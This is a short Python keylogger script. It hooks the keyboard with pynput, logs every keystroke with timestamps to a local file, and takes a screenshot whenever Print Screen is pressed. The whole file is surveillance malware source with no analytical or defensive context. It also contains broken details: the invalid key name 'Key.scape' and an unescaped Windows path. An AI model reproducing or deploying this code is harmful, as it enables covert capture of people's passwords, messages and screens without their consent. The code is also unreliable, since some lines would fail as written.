from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
keys = []
word_counts = 0


def on_each_key_press(key):
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    if word_counts >= 5:
        word_counts = 0
        write_keys_to_file(keys)
        keys = []


def write_keys_to_file(keys):
    with open('C:\keylogger\logs\log.txt', 'a') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            if key == 'Key.space':
                key = str(key).replace("Key.space", " ")
                now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                logfile.write("\n"+str(now))
            logfile.write(key)


def on_each_key_release(key):
    if key == Key.scape:
        return False
    if key == Key.print_screen:
        ss = ImageGrab.grab()
        directory = r'C:\keylogger\screenshots\screenshot-'
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        ss.save(str(directory)+now+'.png')


with Listener(
    on_press=on_each_key_press,
    on_release=on_each_key_release
) as listener:
    listener.join()
